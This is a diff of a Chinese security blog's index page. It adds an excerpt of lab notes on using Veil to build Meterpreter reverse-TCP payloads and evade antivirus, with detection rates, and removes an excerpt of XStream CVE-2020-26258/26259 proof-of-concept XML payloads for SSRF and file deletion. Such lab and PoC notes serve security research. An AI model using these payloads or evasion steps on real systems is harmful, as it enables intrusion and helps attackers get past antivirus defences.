@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1610595137887.css">
+<link rel="stylesheet" href="/css/style.css?v=1610609787427.css">
 
     <!--[if lt IE 9]>
     
@@ -119,6 +119,76 @@
             
         </strong>
     </h3>
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/">
+    		免杀实验笔记之Veil
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-23T06:47:16.000Z">2020-12-23</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="Veil启动"><a href="#Veil启动" class="headerlink" title="Veil启动"></a>Veil启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line">docker exec -it [docker镜像地址] &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">veil</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/1.png"></p>
+<h2 id="Veil使用"><a href="#Veil使用" class="headerlink" title="Veil使用"></a>Veil使用</h2><p>Veil有两个免杀工具，Evasion和Ordnance</p>
+<p>Ordnance可生成再Veil-Evasion中使用的Shellcode，Evasion用作文件免杀，一般选用Evasion</p>
+<p>go &amp; ruby语言encode的编码方式效果较好</p>
+<h2 id="直接生成exe免杀"><a href="#直接生成exe免杀" class="headerlink" title="直接生成exe免杀"></a>直接生成exe免杀</h2><p>选择Evasion&gt;use 16<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/2.png"><br>设置监听地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[go&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LHOST 192.168.70.133</span><br><span class="line">[go&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LPORT 2244</span><br><span class="line">[go&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>
+<p>设置好output的名字即可<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/3.png"></p>
+<p>在/tmp/veil-output/compiled/目录可直接找到生成的payload文件<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/4.png"></p>
+<p>在测试机中上线测试，正常上线<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/5.png"><br>但是被火绒查杀到<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/6.png"></p>
+<h2 id="VT查杀率-47-71"><a href="#VT查杀率-47-71" class="headerlink" title="VT查杀率(47/71)"></a>VT查杀率(47/71)</h2><p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/7.png"></p>
+<h2 id="Veil结合Mingw免杀"><a href="#Veil结合Mingw免杀" class="headerlink" title="Veil结合Mingw免杀"></a>Veil结合Mingw免杀</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[c&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LHOST 192.168.70.133</span><br><span class="line">[c&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LPORT 4466</span><br><span class="line">[c&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>
+<p>生成c的payload<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/8.png"></p>
+<p>然后用mingw编译c文件到exe文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o veil_c_test.exe veil_c_test.c -l ws2_32</span><br></pre></td></tr></table></figure>
+<p>可被火绒查杀到</p>
+<p>msf监听，出现假session<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/10.png"></p>
+<p>VT查杀率(3/71)<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/9.png"></p>
+<h2 id="Veil使用ruby-meterpreter-reverse-tcp-py"><a href="#Veil使用ruby-meterpreter-reverse-tcp-py" class="headerlink" title="Veil使用ruby/meterpreter/reverse_tcp.py"></a>Veil使用ruby/meterpreter/reverse_tcp.py</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ruby&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LHOST 192.168.70.135</span><br><span class="line">[ruby&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LPORT 8899</span><br><span class="line">[ruby&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>
+<p>设置好输出文件的名字，在输出文件夹即可找到生成的payload<br>上传到测试机<br>不幸的是，火绒和360杀毒都能检测到<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/11.png"><br>在火绒和360管家开启的状态下，无法正常上线，关闭则可以<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/12.png"></p>
+
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/" title="免杀实验笔记之Veil">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/3.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
     
         <!-- 文章列表 item -->
 <article class="post">
@@ -621,54 +691,6 @@
 </article>
 
     
-        <!-- 文章列表 item -->
-<article class="post">
-    <header>
-        <!-- 标签这有且只能显示一个 -->
-        
-            <a href="javascript: void(0);" class="cat">未分类</a>
-        
-        <!-- 文章标题 -->
-        
-    <h3 class="post-title">
-    	<a href="https://givemefivw.github.io/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/">
-    		CVE-2020-26258andCVE-2020-26259 Xstream SSRFand任意文件删除POC
-    	</a>
-    </h3>
-
-    </header>
-    <p class="post-meta">
-        Jelon 发表于
-        <time datetime="2020-12-20T12:06:29.000Z">2020-12-20</time>
-        &nbsp;&nbsp;
-        <span class="post-tags">
-            标签：
-            
-        </span>
-    </p>
-
-    <div class="post-content">
-        <div class="post-excerpt">
-            
-                <h2 id="26258-POC"><a href="#26258-POC" class="headerlink" title="26258-POC"></a>26258-POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&#39;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#39;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&#39;javax.activation.URLDataSource&#39;&gt;</span><br><span class="line">            &lt;url&gt;http:&#x2F;&#x2F;localhost:8080&#x2F;internal&#x2F;:&lt;&#x2F;url&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br><span class="line">XStream xstream &#x3D; new XStream();</span><br><span class="line">xstream.fromXML(xml);</span><br></pre></td></tr></table></figure>
-<h2 id="26259-POC"><a href="#26259-POC" class="headerlink" title="26259-POC"></a>26259-POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&#39;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#39;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&#39;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#39;&gt;</span><br><span class="line">            &lt;contentType&gt;text&#x2F;plain&lt;&#x2F;contentType&gt;</span><br><span class="line">            &lt;is class&#x3D;&#39;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#39;&gt;</span><br><span class="line">              &lt;tempFile&gt;&#x2F;etc&#x2F;hosts&lt;&#x2F;tempFile&gt;</span><br><span class="line">            &lt;&#x2F;is&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="参看："><a href="#参看：" class="headerlink" title="参看："></a>参看：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;caiqiiqi&#x2F;article&#x2F;details&#x2F;1111948</span><br></pre></td></tr></table></figure>
-            
-            <p class="more">
-                <a href="https://givemefivw.github.io/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/">阅读剩下更多</a>
-            </p>
-        </div>
-        <div class="post-thumbnail" data-img="">
-            <a href="https://givemefivw.github.io/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/" title="CVE-2020-26258andCVE-2020-26259 Xstream SSRFand任意文件删除POC">
-                
-                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/0.jpg" alt="默认配图" >
-                
-            </a>
-        </div>
-    </div>
-</article>
-
-    
 
     
     <nav class="page-navigator">
@@ -713,6 +735,11 @@
         <!-- 文章分类 -->
 <ul class="widget-bd">
     
+    <li>
+        <a href="/categories/POC-EXP/">POC&amp;EXP</a>
+        <span class="badge">(1)</span>
+    </li>
+    
 </ul>
     </section>
 
@@ -724,7 +751,7 @@
   
     <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (4)</a>
   
-    <a class="tag-item" href="/tags/POC/" title="POC">POC (7)</a>
+    <a class="tag-item" href="/tags/POC/" title="POC">POC (8)</a>
   
     <a class="tag-item" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记 (5)</a>
   
@@ -772,7 +799,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1610595137888.js"></script>
+<script src="/js/main.js?v=1610609787428.js"></script>
 
 
 </body>
